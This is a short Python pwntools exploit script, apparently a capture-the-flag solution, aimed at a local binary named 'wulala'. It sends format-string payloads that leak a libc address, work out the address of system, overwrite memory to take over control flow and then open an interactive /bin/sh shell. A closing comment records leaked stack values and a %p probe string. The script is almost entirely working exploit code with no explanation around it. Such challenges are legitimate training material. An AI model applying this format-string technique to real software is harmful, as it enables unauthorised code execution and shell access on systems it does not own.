# -*- coding: utf-8 -*-
from pwn import *
elf = ELF('./wulala')
r = process('./wulala')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary='./wulala'

printf_off=libc.symbols['printf']
system_off=libc.symbols['system']
off_ret=0x7ffff7a42f2a
A=0x815
B=0x7da
printf_plt=0x20099a
payload="%124c"+"%21$hhn"+"%68c"+"%19$hhn"+"%23$p"
raw_input("Y")
r.sendline(payload)
rep=r.recv();

base=u64(rep[-8:])-off_ret
system_addr=base+system_off

#start hijacking

payload=p64(printf_plt)+"%116c"+"%21$hhn"+"%68c"+"%19$hhn"+"%{}c"+"%6$ln".format(system_addr-192)
r.sendline(payload)
r.sendline("/bin/sh\0")
r.interactive();

'''
0x7ffec2c99150.0x7f9a7c7c28b0.0x1f.0x56390f97c2ac.0x7f9a7c9c54c0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7f000a2e7025.(nil).(nil).
0x7ffec2c991c0.
0x56390f02d823.
0x7ffec2c991d0.
0x56390f02d85c+32.0x56390f02d870.
0x7f9a7c430f2a.(nil).0x7ffec2c992b8

%20$p.%21$p.%22$p.%23$p.%24$p.%25$p.%26$p.%27$p.%28$p.%29$p.%30$p.%31$p.%32$p.%33$p.%34$p.%35$p.%36$p
'''
